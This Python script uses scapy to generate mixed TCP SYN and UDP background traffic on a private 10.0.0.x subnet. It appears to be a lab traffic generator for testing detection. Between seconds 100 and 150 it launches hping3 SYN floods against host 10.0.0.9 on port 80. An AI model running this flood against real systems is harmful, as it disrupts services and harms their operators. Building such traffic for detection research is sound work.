from scapy.all import *
import time
import random
import subprocess
import threading

srcIp = "10.0.0.3"
normalTargets = ["10.0.0.%d" % i for i in range(1, 9) if i != 3]
attackTarget = "10.0.0.9"
duration = 300

def sendAttackPackets(rate):
    subprocess.run([
        "sudo", "hping3",
        "-S", attackTarget,
        "-p", "80",
        "-i", "u4000",
        "-c", str(rate)
    ])

for t in range(duration):
    startTime = time.time()
    count = 0

    targets = normalTargets.copy()
    random.shuffle(targets)
    base = 50 + random.randint(-5, 5)
    rate = max(1, base)

    while count < rate and time.time() - startTime < 1:
        dst = targets[count % len(targets)]
        sport = random.randint(1024, 65535)
        dport = random.choice([80, 443, 53])
        pkt = IP(src=srcIp, dst=dst)

        if random.random() < 0.5:
            pkt /= TCP(sport=sport, dport=dport, flags="S")
        else:
            pkt /= UDP(sport=sport, dport=dport)

        send(pkt, verbose=0)
        count += 1

    if 100 <= t < 150:
        attackRate = max(10, 250 + random.randint(-15, 15))
        threading.Thread(target=sendAttackPackets, args=(attackRate,)).start()

    time.sleep(max(0, 1 - (time.time() - startTime)))

